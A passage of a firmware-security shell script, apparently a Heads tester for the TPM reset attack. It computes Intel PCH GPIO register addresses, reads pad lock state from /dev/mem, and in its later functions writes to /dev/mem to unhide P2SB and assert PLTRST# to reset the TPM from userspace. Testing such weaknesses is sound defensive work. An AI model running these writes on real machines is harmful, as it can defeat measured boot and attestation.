	section "2. REGISTER ADDRESS CALCULATION"

	if [ "$PLATFORM_UNKNOWN" = "y" ]; then
		DEBUG "Platform unknown, skipping register calculation"
		INFO "Platform unknown; skipping register calculation."
		return
	fi

	# Dynamic SBREG_BAR from P2SB (only on SPT/KBP where P2SB is NOT MASKLOCK'd).
	# Falls back to hardcoded values if P2SB is hidden or MASKLOCK'd.
	DEBUG "GLOBAL_PCH=$GLOBAL_PCH GLOBAL_DEV_ID=$GLOBAL_DEV_ID"
	if read_p2sb_sbreg_bar; then
		DEBUG "  SBREG_BAR from P2SB: PCR_BASE=0x$(printf '%x' $PCR_BASE)"
	else
		DEBUG "  Using hardcoded PCR_BASE"
	fi

	# Hardcoded PCR_BASE fallback per platform (verified from Intel GPIO Best
	# Practices doc ID 834810 and coreboot Kconfig). Used when dynamic SBREG_BAR
	# fails (P2SB hidden/MASKLOCK'd by FSP-S).
	case "$GLOBAL_PCH" in
		ADL_P|RPL_P) PCR_BASE=$(( 0xFD000000 )) ;;   # Mobile: kukrimate pcr.c:164
		ADL_S|RPL_S) PCR_BASE=$(( 0xE0000000 )) ;;   # Desktop: kukrimate pcr.c:186
		SPT_KBP|CML_DT) PCR_BASE=$(( 0xFD000000 )) ;;
		TGL)         PCR_BASE=$(( 0xFD000000 )) ;;
		CML_U)       PCR_BASE=$(( 0xFD000000 )) ;;
		ARL_S)       PCR_BASE=$(( 0xE0000000 )) ;;
		CFL_S)       PCR_BASE=$(( 0xFD000000 )) ;;
		CNP_LP)      PCR_BASE=$(( 0xFD000000 )) ;;
		*)           PCR_BASE=$(( 0xFD000000 ))
			         WARN "  Unknown PCH, using default PCR_BASE=0xFD000000" ;;
	esac
	DEBUG "PCR_BASE=0x$(printf '%x' $PCR_BASE) (hardcoded per platform)"

	# All platforms use GPIO PAD_CFG registers via PCR MMIO.
	# Pad number within community
	PAD_OFFSET=$(( PLTRST_PAD - FIRST_PAD ))
	DEBUG "  Pad offset within community: $PLTRST_PAD - $FIRST_PAD = $PAD_OFFSET"
	DEBUG "GPIO_PAD_CFG: pad=$PLTRST_PAD first=$FIRST_PAD offset=$PAD_OFFSET"

	# Each pad uses 16 bytes (4 DWORDS)
	PAD_REG_SIZE=$(( NUM_PAD_CFG_REGS * 4 ))
	DEBUG "  Bytes per pad: $NUM_PAD_CFG_REGS DWORDS x 4 = $PAD_REG_SIZE bytes"

	# Register offset for DW0 of this pad within the community
	PAD_DW0_OFFSET=$(( PAD_CFG_BASE + (PAD_OFFSET * PAD_REG_SIZE) ))
	PAD_DW0_HEX=$(printf "0x%x" "$PAD_DW0_OFFSET")
	DEBUG "  DW0 register offset in community: $(printf "0x%x" $PAD_CFG_BASE) + ($PAD_OFFSET * $PAD_REG_SIZE) = $PAD_DW0_HEX"

	# Full physical address
	COMMUNITY_BASE=$(( PCR_BASE + (COMMUNITY_PORT << 16) ))
	COMMUNITY_BASE_HEX=$(printf "0x%x" "$COMMUNITY_BASE")
	TARGET_ADDR=$(( COMMUNITY_BASE + PAD_DW0_OFFSET ))
	TARGET_ADDR_HEX=$(printf "0x%x" "$TARGET_ADDR")

	DEBUG "GPIO PAD_CFG target: community_base=$COMMUNITY_BASE_HEX target_addr=$TARGET_ADDR_HEX"

	DEBUG "  Register layout for pad $PLTRST_PAD:"
	DEBUG "    Community base (port $COMMUNITY_PORT):  $COMMUNITY_BASE_HEX"
	DEBUG "    PAD_CFG_BASE offset within community:  $(printf "0x%x" $PAD_CFG_BASE)"
	DEBUG "    Pad config DW0:                        $TARGET_ADDR_HEX"
	DEBUG "    Pad config DW1:                        $(printf "0x%x" $((TARGET_ADDR + 4)))"
	DEBUG "    Pad config DW2:                        $(printf "0x%x" $((TARGET_ADDR + 8)))"
	DEBUG "    Pad config DW3:                        $(printf "0x%x" $((TARGET_ADDR + 12)))"

	# 64-bit PCR_BASE overflow check
	# BusyBox ash / dash use 32-bit signed arithmetic. If the dynamic
	# SBREG_BAR (from P2SB BAR) is above 4GB (e.g., 0x5F_F000_0000 for
	# Arrow Lake per Intel doc), the PCR_BASE calculation will overflow.
	# Currently no Heads platform has SBREG_BAR above 4GB, but this is
	# a documented limitation for future platforms.
	_hi32=$(( (PCR_BASE >> 32) & 0xFFFFFFFF ))
	if [ "$_hi32" != "0" ]; then
		WARN "  PCR_BASE overflows 32-bit arithmetic (hi32=$_hi32)."
		WARN "  Address calculations below will be WRONG."
		WARN "  BusyBox sh does not support 64-bit arithmetic."
	fi

	DEBUG "  DW0 bit fields (PAD_CFG0):"
	DEBUG "    [0]    TX state (1=high, 0=low)"
	DEBUG "    [1]    RX state (read-only)"
	DEBUG "    [8]    TX disable"
	DEBUG "    [9]    RX disable"
	DEBUG "    [13:10] Mode (0000=GPIO, 0001=NF1, ...)"
	DEBUG "    [31:30] Reset config (10=PLTRST)"
}

# ---- Read current register configuration -------------------------------

read_pad_config() {
	TRACE_FUNC
	section "3. CURRENT REGISTER CONFIGURATION"

	if [ "$PLATFORM_UNKNOWN" = "y" ]; then
		DEBUG "Platform unknown, skipping configuration read"
		INFO "Platform unknown; skipping configuration read."
		return
	fi

	INFO "  Attempting to read registers from physical memory..."
	DEBUG "read_pad_config: MECHANISM=$MECHANISM TARGET_ADDR=$TARGET_ADDR_HEX"
	DEBUG ""

	# Check that /dev/mem is accessible
	if [ ! -r /dev/mem ]; then
		DEBUG "/dev/mem not readable (expected on production kernels)"
		INFO "  /dev/mem is not readable. This is expected on most production"
		INFO "  kernels without CONFIG_STRICT_DEVMEM disabled."
		DEBUG ""
		INFO "  To test on QEMU or a development kernel, boot with:"
		INFO "    iomem=relaxed"
		INFO "  or disable CONFIG_STRICT_DEVMEM."
		DEBUG ""
		INFO "Cannot read actual config. Showing expected values."
		return
	fi

	# All platforms use GPIO PAD_CFG registers via PCR MMIO
	DEBUG "Reading DW0 at $TARGET_ADDR_HEX"
	if ! command -v xxd >/dev/null 2>&1; then
		INFO "Missing 'xxd' command. Cannot parse binary data."
		return
	fi
	# Read DW0
	PAD_DW0_VAL=$(dd if=/dev/mem bs=4 count=1 skip="$(( TARGET_ADDR / 4 ))" 2>/dev/null | xxd -p 2>/dev/null || true)
	DEBUG "DW0 read returned: $PAD_DW0_VAL"

	if [ -z "$PAD_DW0_VAL" ] || [ "$PAD_DW0_VAL" = "0" ] || [ "$PAD_DW0_VAL" = "00000000" ]; then
		DEBUG "DW0 read invalid (blocked or zero), using expected values"
		INFO "  Read returned: $PAD_DW0_VAL (likely invalid / blocked by kernel)"
		INFO "Cannot read actual pad config. Showing expected values."
		return
	fi

	_orig_dw0=$(( 16#${PAD_DW0_VAL} ))
	_orig_mode=$(( (_orig_dw0 >> 10) & 0x7 ))
	_orig_txstate=$(( _orig_dw0 & 1 ))
	_orig_txdis=$(( (_orig_dw0 >> 8) & 1 ))
	_orig_rxdis=$(( (_orig_dw0 >> 9) & 1 ))
	_orig_reset=$(( (_orig_dw0 >> 30) & 3 ))
	DEBUG "Decoded DW0: mode=$_orig_mode tx=$_orig_txstate txdis=$_orig_txdis rxdis=$_orig_rxdis reset=$_orig_reset"

	_orig_mode_str=""
	case $_orig_mode in
		0) _orig_mode_str="GPIO" ;;
		1) _orig_mode_str="NF1 (native function 1)" ;;
		2) _orig_mode_str="NF2" ;;
		3) _orig_mode_str="NF3" ;;
		4) _orig_mode_str="NF4" ;;
		5) _orig_mode_str="NF5" ;;
		6) _orig_mode_str="NF6" ;;
		7) _orig_mode_str="NF7" ;;
	esac

	_orig_reset_str=""
	case $_orig_reset in
		0) _orig_reset_str="PWROK" ;;
		1) _orig_reset_str="DEEP" ;;
		2) _orig_reset_str="PLTRST" ;;
		3) _orig_reset_str="RSMRST" ;;
	esac

	DEBUG "mode_str=$_orig_mode_str reset_str=$_orig_reset_str"
	DEBUG "  DW0 register: 0x$PAD_DW0_VAL"
	DEBUG "  Decoded: mode=$_orig_mode ($_orig_mode_str) tx=$_orig_txstate txdis=$_orig_txdis rxdis=$_orig_rxdis reset=$_orig_reset ($_orig_reset_str)"

	if [ "$_orig_mode" = "1" ] && [ $_orig_txdis = 0 ]; then
		DEBUG "Pad mode=NF1 txdis=0: correctly configured as native function output"
		STATUS_OK "Pad is correctly configured as native function output."
	elif [ "$_orig_mode" = "0" ]; then
		DEBUG "Pad mode=GPIO: ALREADY in GPIO mode"
		DEBUG "Pad is in GPIO mode -- will attempt NF1 force before asserting PLTRST#"
		case "$GLOBAL_PCH" in
			SPT_KBP)
				INFO "  Pad is in GPIO mode (not native-function PLTRST#). If the"
				INFO "  GPIO lock is absent, the pad can be reprogrammed to assert"
				INFO "  PLTRST# from userspace -- platform is VULNERABLE." ;;
			CNP_LP)
				INFO "  Pad is in GPIO mode (not native-function PLTRST#). Mechanism"
				INFO "  theoretically possible but no public test data for this PCH." ;;
			ADL_P|RPL_P|ADL_S|RPL_S)
				INFO "  Pad is currently in GPIO mode. GPIO lock is absent"
				INFO "  (PADCFGLOCK=0), but PLTRST# assertion is NOT confirmed"
				INFO "  on this PCH die. Hardware test results: mode bits [13:10]"
				INFO "  and TX[0] are write-ignored at PCH die level despite"
				INFO "  PADCFGLOCK=0." ;;
			*)
				INFO "  Pad is in GPIO mode (not native-function PLTRST#). If the"
				INFO "  GPIO lock is absent, the pad can be reprogrammed to assert"
				INFO "  PLTRST# from userspace -- platform is VULNERABLE." ;;
		esac
	fi
}

# ---- Dynamic SBREG_BAR from P2SB ------------------------------------
#
# Attempts to read SBREG_BAR dynamically from the P2SB (Primary to Sideband)
# bridge at PCI B:D:F 00:1f.1 (device 31, function 1).
#
# The P2SB provides the base address for sideband register access (SBREG_BAR)
# that determines PCR_BASE. On most platforms this is hardcoded, but reading
# it dynamically validates the value and catches future platform changes.
#
# Strategy:
# 1. Unhide P2SB by writing 0 to BCTRL register (offset 0xE0, clear HIDE bit 0)
# 2. Read BAR0 (offset 0x10) and BAR1 (offset 0x14)
# 3. Compute 64-bit base: BAR0 | (BAR1 << 32)
# 4. Re-hide P2SB by restoring BCTRL
# 5. If MASKLOCK'd (bit 8 of BCTRL), write is ignored — fall back to hardcoded
#
# Only attempted on SPT/KBP where P2SB is NOT MASKLOCK'd per kukri.
# Returns: 0 on success with SBREG_BAR_64 set, 1 on failure.
#
# MMCFG base for PCI config space access. Try common bases.
_MMCFG_BASES="0xE0000000 0xF8000000"

read_p2sb_sbreg_bar() {
	TRACE_FUNC

	# Only attempt on platforms where P2SB is known to be unhideable
	case "$GLOBAL_PCH" in
		SPT_KBP) DEBUG "read_p2sb_sbreg_bar: attempting on $GLOBAL_PCH" ;;
		*)       DEBUG "read_p2sb_sbreg_bar: skipping (P2SB likely MASKLOCK'd on $GLOBAL_PCH)"
		          return 1 ;;
	esac

	if [ ! -r /dev/mem ] || [ ! -w /dev/mem ]; then
		DEBUG "read_p2sb_sbreg_bar: /dev/mem not r/w"
		return 1
	fi
	if ! command -v xxd >/dev/null 2>&1; then
		DEBUG "read_p2sb_sbreg_bar: xxd not available"
		return 1
	fi

	# P2SB at PCI B:D:F 00:1f.1
	_p2sb_mmcfg_offset=$(( (31 << 15) | (1 << 12) ))   # 0x10800

	for _mmcfg_base_hex in $_MMCFG_BASES; do
		_mmcfg_base=$(( $_mmcfg_base_hex ))
		_p2sb_base=$(( _mmcfg_base + _p2sb_mmcfg_offset ))

		# Read vendor/device to confirm P2SB is at this MMCFG address
		_vendor=$(mem_read32 "$_p2sb_base" 2>/dev/null || true)
		_vendor_dec=$(( 16#${_vendor:-0000} & 0xFFFF ))
		if [ "$_vendor_dec" != "0x8086" ] && [ "$_vendor_dec" != "32902" ]; then
			# 0x8086 = 32902 decimal; vendor read is 0x8086 + device ID in upper 16 bits
			_ven_check=$(( 16#${_vendor:-0000} & 0xFFFF ))
			if [ "$_ven_check" != "32902" ]; then
				DEBUG "  MMCFG 0x$(printf '%x' $_mmcfg_base): vendor=0x$_vendor (not Intel), skipping"
				continue
			fi
		fi
		DEBUG "  Found P2SB at MMCFG 0x$(printf '%x' $_p2sb_base)"

		# Read BCTRL at offset 0xE0 to check HIDE and MASKLOCK
		_bctrl_addr=$(( _p2sb_base + 0xE0 ))
		_bctrl=$(mem_read32 "$_bctrl_addr" 2>/dev/null || true)
		_bctrl_dec=$(( 16#${_bctrl:-00000000} ))
		_hide=$(( _bctrl_dec & 1 ))
		_masklock=$(( (_bctrl_dec >> 8) & 1 ))
		DEBUG "  BCTRL at 0x$(printf '%x' $_bctrl_addr): 0x$_bctrl (HIDE=$_hide MASKLOCK=$_masklock)"

		# Save original BCTRL, clear HIDE bit to unhide P2SB
		_orig_bctrl=$_bctrl_dec
		_unhide_val=$(( _bctrl_dec & ~1 ))
		mem_write32 "$_bctrl_addr" "$_unhide_val"

		# Re-read BCTRL to check if write took effect (not MASKLOCK'd)
		_bctrl2=$(mem_read32 "$_bctrl_addr" 2>/dev/null || true)
		_bctrl2_dec=$(( 16#${_bctrl2:-00000000} ))
		if [ "$_bctrl2_dec" = "$_bctrl_dec" ]; then
			DEBUG "  P2SB unhide write ignored (MASKLOCK'd or read-only)"
			return 1
		fi
		DEBUG "  P2SB unhidden successfully"

		# Read BAR0 and BAR1
		_bar0_addr=$(( _p2sb_base + 0x10 ))
		_bar0=$(mem_read32 "$_bar0_addr" 2>/dev/null || true)
		_bar1_addr=$(( _p2sb_base + 0x14 ))
		_bar1=$(mem_read32 "$_bar1_addr" 2>/dev/null || true)
		_bar0_dec=$(( 16#${_bar0:-00000000} ))
		_bar1_dec=$(( 16#${_bar1:-00000000} ))
		DEBUG "  SBREG_BAR: BAR0=0x$_bar0 BAR1=0x$_bar1"

		# Re-hide P2SB
		mem_write32 "$_bctrl_addr" "$_orig_bctrl"
		DEBUG "  P2SB re-hidden"

		# Compute 64-bit base (strip lower bits as per PCI BAR encoding)
		SBREG_BAR_64=$(( (_bar1_dec << 32) | (_bar0_dec & 0xFFFFFFF0) ))
		DEBUG "  SBREG_BAR_64=0x$(printf '%llx' $SBREG_BAR_64 2>/dev/null || printf '0x%x%08x' $((SBREG_BAR_64 >> 32)) $((SBREG_BAR_64 & 0xFFFFFFFF)))"

		# Verify it's a reasonable PCR_BASE (must be >= 0xE0000000 and page-aligned)
		_hi32=$(( SBREG_BAR_64 >> 32 ))
		if [ "$_hi32" != "0" ]; then
			DEBUG "  SBREG_BAR above 4GB: hi32=$_hi32"
		fi
		_lo32=$(( SBREG_BAR_64 & 0xFFFFFFFF ))
		if [ $(( _lo32 & 0xFFFFF )) -eq 0 ] && [ $(( _lo32 >> 28 )) -ge 14 ]; then
			DEBUG "  SBREG_BAR verified as valid sideband register base"
			# Use 32-bit portion for PCR_BASE
			PCR_BASE=$_lo32
			DEBUG "  PCR_BASE set from SBREG_BAR: 0x$(printf '%x' $PCR_BASE)"
			return 0
		fi
		DEBUG "  SBREG_BAR hi32=$_hi32 lo32=0x$(printf '%x' $_lo32) looks invalid, using hardcoded"
	done

	return 1
}

# ---- Platform parameter helpers --------------------------------------
#
# Returns the PADCFGLOCK base offset for the current platform.
# This mapping is the single source of truth -- all callers use this
# instead of duplicating the case statement.
_get_lock_base() {
	case "$GLOBAL_PCH" in
		ADL_P)      echo 0x80  ;;
		RPL_P)      echo 0x110 ;;
		ADL_S|RPL_S) echo 0x110 ;;
		SPT_KBP|CML_DT) echo 0xA8 ;;
		TGL)        echo 0x80  ;;
		CML_U)      echo 0x88  ;;
		CFL_S)      echo 0x88  ;;
		ARL_S)      echo 0x120 ;;
		CNP_LP)     echo 0x80  ;;
		*)          echo 0x80  ;;
	esac
}

# Returns the bus pin community port for the current platform.
_get_bus_community_port() {
	case "$GLOBAL_PCH" in
		SPT_KBP|CML_DT) echo 0xaf ;;
		ADL_P|RPL_P|TGL|CML_U|CFL_S|CNP_LP) echo 0x6e ;;
		ADL_S|RPL_S|ARL_S) echo 0x6d ;;
		*) echo "" ;;
	esac
}

# Returns the bus pin lock base offset for the current platform.
_get_bus_lock_base() {
	case "$GLOBAL_PCH" in
		SPT_KBP|CML_DT) echo 0xa0 ;;
		TGL|ADL_P|RPL_P) echo 0x80 ;;
		CML_U|CFL_S)    echo 0x88 ;;
		ADL_S|RPL_S)    echo 0x110 ;;
		ARL_S)          echo 0x120 ;;
		CNP_LP)         echo 0x80 ;;
		*)              echo 0x80 ;;
	esac
}

# ---- eSPI vs LPC auto-detection --------------------------------------
#
# Reads the eSPI configuration register via PCR to determine whether the
# PCH is running in eSPI mode (GPP_A1-A4 = IO0-3) or LPC mode
# (GPP_A1-A6 = LAD0-3, LFRAME#, SERIRQ).
#
# Reference: kukri detect/detect.c and Intel doc 834810.
# PCR port 0xC7, offset 0x3418, bit 1 (eSPI_En) when set → eSPI mode.
#
# Returns: 0 if eSPI, 1 if LPC, 127 if detection unavailable

auto_detect_espi_mode() {
	TRACE_FUNC
	_espi_port=0xC7
	_espi_offset=0x3418
	_espi_comm_base=$(( PCR_BASE + (_espi_port << 16) ))
	_espi_addr=$(( _espi_comm_base + _espi_offset ))

	if [ ! -r /dev/mem ]; then
		DEBUG "auto_detect_espi_mode: /dev/mem not readable"
		return 127
	fi
	if ! command -v xxd >/dev/null 2>&1; then
		DEBUG "auto_detect_espi_mode: xxd not available"
		return 127
	fi

	_espi_val=$(mem_read32 "$_espi_addr" 2>/dev/null || true)
	if [ -z "$_espi_val" ] || [ "$_espi_val" = "00000000" ]; then
		DEBUG "auto_detect_espi_mode: read failed or zero at 0x$(printf '%x' $_espi_addr)"
		return 127
	fi
	_espi_dec=$(( 16#$_espi_val ))
	_espi_en=$(( (_espi_dec >> 1) & 1 ))
	DEBUG "auto_detect_espi_mode: PCR 0xC7:0x3418 = 0x$_espi_val, eSPI_En bit = $_espi_en"
	if [ "$_espi_en" = "1" ]; then
		return 0
	else
		return 1
	fi
}

# ---- Bus pin lock checking (kukri detect utility) --------------------
#
# Checks PADCFGLOCK for LPC/eSPI bus pins (GPP_A group) that should be
# locked by firmware to prevent bus-level manipulation.
#
# Architecture-dependent set of pins checked:
#   LPC platforms (SPT/KBP, CNP-LP): GPP_A1-A6 (LAD0-3, LFRAME#, SERIRQ,
#   CLKRUN#), GPP_A8, GPP_A9
#   eSPI platforms (ADL-P, ADL-S, RPL-P, RPL-S): GPP_A1-A4 (IO0-3),
#   GPP_A14 (ESPI_RESET#)
#
# Reference: kukri detect/detect.c

check_bus_pin_locks() {
	TRACE_FUNC

	if [ "$PLATFORM_UNKNOWN" = "y" ]; then
		return
	fi

	if [ ! -r /dev/mem ]; then
		DEBUG "check_bus_pin_locks: /dev/mem not readable, skipping"
		return
	fi

	if ! command -v xxd >/dev/null 2>&1; then
		DEBUG "check_bus_pin_locks: xxd not available, skipping"
		return
	fi

	# Platform-specific bus pin community port and PADCFGLOCK offset
	# from consolidated helpers:
	_bus_community_port=$(_get_bus_community_port 2>/dev/null || echo "")
	if [ -z "$_bus_community_port" ]; then
		DEBUG "check_bus_pin_locks: no bus pin config for $GLOBAL_PCH"
		return
	fi
	_bus_lock_base=$(_get_bus_lock_base 2>/dev/null || echo 0x80)
	_is_espi="n"  # default fallback, overridden by auto-detection below

	# Attempt auto-detection of eSPI vs LPC mode. Overrides hardcoded
	# _is_espi if the PCR register is readable.
	if auto_detect_espi_mode; then
		_is_espi="y"
		DEBUG "check_bus_pin_locks: auto-detected eSPI mode"
	elif [ $? -eq 1 ]; then
		_is_espi="n"
		DEBUG "check_bus_pin_locks: auto-detected LPC mode"
	fi

	_bus_community_base=$(( PCR_BASE + (_bus_community_port << 16) ))

	# LPC bus:  GPP_A1-A6 (LAD0-3,LFRAME#,SERIRQ,CLKRUN#), GPP_A8 (CLKRUN#), GPP_A9 (CLKOUT_LPC0)
	# eSPI bus: GPP_A1-A4 (IO0-3), GPP_A5 (ESPI_CS#), GPP_A9 (ESPI_CLK), GPP_A14 (ESPI_RESET#)
	# Local pads are relative to GROUP_A0 which is pad 0 within the community
	# (FIRST_PAD=0 on all supported platforms).
	# PADCFGLOCK dword covers 32 pads. All bus pins are in dword 0 (pads 0-31).
	if [ "$_is_espi" = "y" ]; then
		_bus_pads="1 2 3 4 5 9 14"
		_bus_signals="IO0 IO1 IO2 IO3 ESPI_CS# ESPI_CLK ESPI_RESET#"
	else
		_bus_pads="1 2 3 4 5 6 8 9"
		_bus_signals="LAD0 LAD1 LAD2 LAD3 LFRAME# SERIRQ CLKRUN# CLKOUT_LPC0"
	fi

	# Convert space-separated strings to arrays for parallel iteration
	_bus_pad_list=($_bus_pads)
	_bus_sig_list=($_bus_signals)

	# Read the PADCFGLOCK dword (all bus pins are in dword 0)
	_lock_addr=$(( _bus_community_base + _bus_lock_base ))
	_lock_val=$(mem_read32 "$_lock_addr" 2>/dev/null || true)

	# Read PADCFGLOCKTX (TX state lock at +4)
	_locktx_addr=$(( _lock_addr + 4 ))
	_locktx_val=$(mem_read32 "$_locktx_addr" 2>/dev/null || true)

	if [ -z "$_lock_val" ] || [ "$_lock_val" = "00000000" ]; then
		DEBUG "  PADCFGLOCK at 0x$(printf '%x' $_lock_addr): 0x$_lock_val"
		# Zero is valid: could mean all pins unlocked, or read failed.
		# Check if /dev/mem read actually succeeded by testing a known
		# readable register (PCR_BASE).
		_test_read=$(dd if=/dev/mem bs=4 count=1 skip=$(( PCR_BASE / 4 )) 2>/dev/null | xxd -p | tr -d '\n ')
		if [ -z "$_test_read" ] || [ "$_test_read" = "00000000" ]; then
			DEBUG "  bus pin lock read invalid (PCR_BASE read also zero); skipping"
			return
		fi
	fi
	_lock_dec=$(( 16#$_lock_val ))
	_locktx_dec=$(( 16#${_locktx_val:-00000000} ))

	BUS_LOCKED_COUNT=0
	BUS_TOTAL_COUNT=${#_bus_pad_list[@]}

	STATUS "  Bus pin lock status (LPC/eSPI) -- CFG/TX:"

	_idx=0
	while [ $_idx -lt ${#_bus_pad_list[@]} ]; do
		_pad=${_bus_pad_list[$_idx]}
		_sig=${_bus_sig_list[$_idx]}
		_bit=$(( _pad % 32 ))

		_cfg_locked="UNLOCKED"
		_tx_locked="UNLOCKED"
		if [ $(( _lock_dec & (1 << _bit) )) -ne 0 ]; then
			_cfg_locked="LOCKED"
			BUS_LOCKED_COUNT=$(( BUS_LOCKED_COUNT + 1 ))
		fi
		if [ $(( _locktx_dec & (1 << _bit) )) -ne 0 ]; then
			_tx_locked="LOCKED"
		fi
		_lock_status="UNLOCKED"
		_status_level="INFO"
		if [ "$_cfg_locked" = "LOCKED" ] || [ "$_tx_locked" = "LOCKED" ]; then
			_lock_status="LOCKED"
			_status_level="WARN"
		fi
		# Report combined status
		"$_status_level" "    GPP_A$_pad ($_sig): $_lock_status (CFG=$_cfg_locked / TX=$_tx_locked)"
		_idx=$(( _idx + 1 ))
	done

	INFO "  Bus pin lock status: $BUS_LOCKED_COUNT/$BUS_TOTAL_COUNT pins locked (CFG), TX state lock status shown per-pin"
}

# ---- Assert PLTRST# via GPIO pad manipulation ------------------------
#
# Sub-functions split from perform_tpm_gpio_reset() for readability.

# Check PADCFGLOCK and PADCFGLOCKTX registers before asserting PLTRST#
check_lock_registers() {
	TRACE_FUNC
	DEBUG "check_lock_registers: PAD_OFFSET=$PAD_OFFSET"
	_lock_base=$(_get_lock_base 2>/dev/null || echo 0x80)
	DEBUG "  _lock_base from helper: 0x$(printf '%x' $_lock_base)"
	_lock_reg_idx=$(( PAD_OFFSET / 32 ))
	_lock_offset=$(( _lock_base + (_lock_reg_idx * PADCFGLOCK_STRIDE) ))
	_lock_addr=$(( COMMUNITY_BASE + _lock_offset ))
	_lock_val=$(mem_read32 "$_lock_addr" 2>/dev/null || true)
	if [ -n "$_lock_val" ]; then
		_lock_dec=$(( 16#$_lock_val ))
		_lock_bit=$(( 1 << (PAD_OFFSET % 32) ))
		DEBUG "PADCFGLOCK at 0x$(printf '%x' $_lock_addr): 0x$_lock_val (local pad=$PAD_OFFSET, reg=$_lock_reg_idx, bit=$(( PAD_OFFSET % 32 )))"
		if [ $(( _lock_dec & _lock_bit )) -ne 0 ]; then
			WARN "  PLTRST pad is LOCKED (PADCFGLOCK dword $_lock_reg_idx bit $(( PAD_OFFSET % 32 )) set)"
			WARN "  Writes to PAD_CFG registers will be silently ignored."
		else
			DEBUG "  PLTRST pad NOT locked -- writes should work"
		fi
	else
		DEBUG "  Could not read PADCFGLOCK register"
	fi

	# Check PADCFGLOCKTX (TX state lock at the same dword offset + 4)
	_locktx_offset=$(( _lock_offset + 4 ))
	_locktx_addr=$(( COMMUNITY_BASE + _locktx_offset ))
	_locktx_val=$(mem_read32 "$_locktx_addr" 2>/dev/null || true)
	if [ -n "$_locktx_val" ]; then
		_locktx_dec=$(( 16#$_locktx_val ))
		DEBUG "PADCFGLOCKTX at 0x$(printf '%x' $_locktx_addr): 0x$_locktx_val (bit $(( PAD_OFFSET % 32 )))"
		if [ $(( _locktx_dec & _lock_bit )) -ne 0 ]; then
			DEBUG "  TX state is LOCKED (PADCFGLOCKTX bit $(( PAD_OFFSET % 32 )) set)"
		fi
	else
		DEBUG "  Could not read PADCFGLOCKTX register"
	fi
}

# Shutdown TPM and save pad configuration before assert
pre_assertion_setup() {
	TRACE_FUNC
	if command -v tpmr.sh >/dev/null 2>&1; then
		INFO "  Shutting down TPM before PLTRST# assertion (tpmr.sh shutdown)..."
		tpmr.sh shutdown || WARN "tpmr.sh shutdown failed; continuing"
	else
		DEBUG "  tpmr.sh not available; skipping TPM shutdown"
	fi
	INFO "  Saving current PLTRST# pad configuration..."
	_dw0=$(mem_read32 "$TARGET_ADDR" 2>/dev/null)
	_dw1=$(mem_read32 "$((TARGET_ADDR + 4))" 2>/dev/null)
	if [ -z "$_dw0" ]; then
		DIE "Failed to read pad configuration at $TARGET_ADDR_HEX"
	fi
	_dw0_val=$(( 16#$_dw0 ))
	_dw1_val=$(( 16#$_dw1 ))
	_cur_mode=$(( (_dw0_val >> 10) & 0x7 ))
	_cur_tx=$(( _dw0_val & 1 ))
	_cur_hostsw=$(( (_dw0_val >> 14) & 1 ))
	_cur_rstcfg=$(( (_dw0_val >> 30) & 3 ))
	_cur_txdis=$(( (_dw0_val >> 8) & 1 ))
	DEBUG "  Saved DW0=0x$_dw0 DW1=0x$_dw1"
	DEBUG "    DW0 decode: raw=0x$(printf '%08x' $_dw0_val) mode=$_cur_mode TX=$_cur_tx TX_DIS=$_cur_txdis HOSTSW=$_cur_hostsw RSTCFG=$_cur_rstcfg"
	STATUS_OK "Saved PLTRST# pad config: DW0=0x$_dw0, DW1=0x$_dw1"
}

# Assert PLTRST# via GPIO pad toggle
assert_pltrst() {
	TRACE_FUNC
	# If pad is in GPIO mode and NF1 switch failed, try TX toggle
	if [ "$_cur_mode" = "0" ]; then
		DEBUG "  pad in GPIO mode (HOSTSW_OWN=$_cur_hostsw); forcing NF1 first"
		_nf1_val=$(( 0x40000000 | (1 << 10) | 1 ))
		DEBUG "  writing NF1: 0x$(printf '%08x' $_nf1_val)"
		mem_write32 "$TARGET_ADDR" "$_nf1_val"
		_nf1_rb=$(mem_read32 "$TARGET_ADDR" 2>/dev/null)
		_nf1_rb_mode=$(( ((16#$_nf1_rb) >> 10) & 0x7 ))
		DEBUG "  NF1 readback: 0x$_nf1_rb mode=$_nf1_rb_mode"
		if [ "$_nf1_rb_mode" != "1" ]; then
			DEBUG "  NF1 mode switch FAILED (mode=$_nf1_rb_mode); mode bits hardware-locked"
			INFO "  NF1 mode locked -- trying TX toggle instead"
		fi
	fi

	if [ "$_cur_mode" = "0" ] && [ "$_nf1_rb_mode" != "1" ]; then
		DEBUG "  TX toggle: writing 0x80000001 (TX=high)..."
		mem_write32 "$TARGET_ADDR" "0x80000001"
		_tx1_rb=$(mem_read32 "$TARGET_ADDR")
		_tx1_tx=$(( 16#$_tx1_rb & 1 ))
		DEBUG "    TX=1 readback: 0x$_tx1_rb TX=$_tx1_tx"
		sleep 0.1
		DEBUG "  TX toggle: writing $GPIO_ASSERT_VALUE (TX=low)..."
		mem_write32 "$TARGET_ADDR" "$GPIO_ASSERT_VALUE"
	else
		DEBUG "  kukrimate: writing $GPIO_ASSERT_VALUE (GPIO+TX=0)..."
		mem_write32 "$TARGET_ADDR" "$GPIO_ASSERT_VALUE"
	fi
	_readback=$(mem_read32 "$TARGET_ADDR")
	_rb_mode=$(( ((16#$_readback) >> 10) & 0x7 ))
	_rb_tx=$(( 16#$_readback & 1 ))
	DEBUG "  assert write readback: 0x$_readback mode=$_rb_mode TX=$_rb_tx"
	INFO "  PLTRST# asserted ($([ "$_cur_mode" = "0" ] && [ "$_nf1_rb_mode" != "1" ] && echo 'TX toggle' || echo 'kukrimate'))"

	INFO "  Writing 0x00000000 to DW1..."
	mem_write32 "$((TARGET_ADDR + 4))" "0x00000000"
	_readback2=$(mem_read32 "$((TARGET_ADDR + 4))")
	DEBUG "  DW1 readback: 0x$_readback2"

	# Wait with PLTRST# asserted
	INFO "  Waiting 1 second with PLTRST# asserted..."
	sleep 1

	# Deassert PLTRST#
	if [ "$_cur_mode" = "0" ]; then
		DEBUG "  deasserting PLTRST# via NF1 (original mode was GPIO+TX=0)"
		mem_write32 "$TARGET_ADDR" "$_nf1_val"
	else
		INFO "  Restoring original pad config (deasserts PLTRST#)..."
		mem_write32 "$TARGET_ADDR" "$_dw0_val"
		mem_write32 "$((TARGET_ADDR + 4))" "$_dw1_val"
	fi

	# Wait for TPM to reinitialize
	INFO "  Waiting 1s for TPM to reinitialize after PLTRST# deassert..."
	sleep 1
}

# Recreate TPM sessions and verify bus reset
post_assertion_cleanup() {
	TRACE_FUNC
	INFO "  Starting TPM after PLTRST# assertion (tpm2 startup -c)..."
	if command -v tpm2 >/dev/null 2>&1; then
		_startup_out=$(tpm2 startup -c 2>&1)
		if [ $? -eq 0 ]; then
